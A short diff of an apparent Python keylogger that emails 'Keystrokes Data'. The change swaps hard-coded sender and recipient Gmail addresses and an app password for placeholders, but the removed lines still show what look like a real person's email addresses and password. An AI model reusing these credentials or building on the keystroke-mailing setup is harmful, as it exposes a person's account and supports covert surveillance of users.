@@ -6,9 +6,9 @@ from email.mime.application import MIMEApplication
 import os
 
 # Define email parameters
-EMAIL_ADDRESS = 'rifat368427@gmail.com'
-EMAIL_PASSWORD = 'hrtcvhgusnfryfij'
-TO_EMAIL = 'mohammad.rifatkhan01@gmail.com'
+EMAIL_ADDRESS = 'youremail@gmail.com'
+EMAIL_PASSWORD = 'pass'
+TO_EMAIL = 'recieveremail@gmail.com'
 SUBJECT = 'Keystrokes Data'
 
 # Function to send email
